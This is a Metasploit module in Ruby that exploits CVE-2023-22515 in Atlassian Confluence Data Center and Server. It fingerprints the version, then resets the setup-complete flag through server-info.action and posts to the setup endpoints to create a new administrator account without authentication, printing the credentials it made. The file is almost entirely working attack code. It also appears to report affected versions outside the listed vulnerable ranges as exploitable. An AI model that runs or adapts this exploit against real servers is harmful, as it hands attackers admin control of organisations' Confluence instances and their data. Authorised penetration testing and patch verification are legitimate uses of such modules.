##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Atlassian Confluence Data Center and Server Authentication Bypass via Broken Access Control',
        'Description' => %q{
          This module exploits a broken access control vulnerability in Atlassian Confluence servers leading to an authentication bypass.
          A specially crafted request can be create new admin account without authentication on the target Atlassian server.
        },
        'Author' => [
          'Unknown', # exploited in the wild
          'Emir Polat' # metasploit module
        ],
        'References' => [
          ['CVE', '2023-22515'],
          ['URL', 'https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-22515'],
          ['URL', 'https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis']
        ],
        'DisclosureDate' => '2023-10-04',
        'DefaultOptions' => {
          'RPORT' => 8090
        },
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(8)]),
      OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(8)]),
      OptString.new('NEW_EMAIL', [true, 'E-mail to be used when creating a new user with admin privileges', 'admin_1337@localhost.com'])
    ])
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/login.action')
    )
    return nil unless res&.code == 200

    poweredby = res.get_xml_document.xpath('//ul[@id="poweredby"]/li[@class="print-only"]/text()').first&.text
    return nil unless poweredby =~ /Confluence (\d+(\.\d+)*)/

    confluence_version = Rex::Version.new(Regexp.last_match(1))

    return Exploit::CheckCode::Unknown unless confluence_version

    vprint_status("Detected Confluence version: #{confluence_version}")

    if confluence_version.between?(Rex::Version.new('8.0.0'), Rex::Version.new('8.3.3')) ||
       confluence_version.between?(Rex::Version.new('8.4.0'), Rex::Version.new('8.4.3')) ||
       confluence_version.between?(Rex::Version.new('8.5.0'), Rex::Version.new('8.5.2'))
      return Exploit::CheckCode::Appears("Exploitable version of Confluence: #{confluence_version}")
    end

    Exploit::CheckCode::Appears("Confluence version: #{confluence_version}")
  end

  def run
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/server-info.action'),
      'vars_get' => {
        'bootstrapStatusProvider.applicationConfig.setupComplete' => 'false'
      }
    )

    return fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Version vulnerable but setup is already completed') unless res&.code == 302 || res&.code == 200

    print_good('Found server-info.action ! Trying to ignore setup.')

    create_admin_user

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'setup/finishsetup.action'),
      'headers' => {
        'X-Atlassian-Token' => 'no-check'
      }
    )

    return fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Admin user was created but setup could not be completed.') unless res&.code == 200

    print_good("Admin user was created successfully. Credentials: #{datastore['NEW_USERNAME']} - #{datastore['NEW_PASSWORD']}")
    print_good("Now you can login as adminstrator from: http://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}login.action")
  end

  def create_admin_user
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'setup/setupadministrator.action'),
      'headers' => {
        'X-Atlassian-Token' => 'no-check'
      },
      'vars_post' => {
        'username' => datastore['NEW_USERNAME'],
        'fullName' => 'New Admin',
        'email' => datastore['NEW_EMAIL'],
        'password' => datastore['NEW_PASSWORD'],
        'confirm' => datastore['NEW_PASSWORD'],
        'setup-next-button' => 'Next'
      }
    )

    return fail_with(Msf::Exploit::Failure::NoAccess, 'The admin user could not be created. Try a different username.') unless res&.code == 302

    print_good('Setup reverted back to the beginning. Attempting to create new admin user!')
  end
end
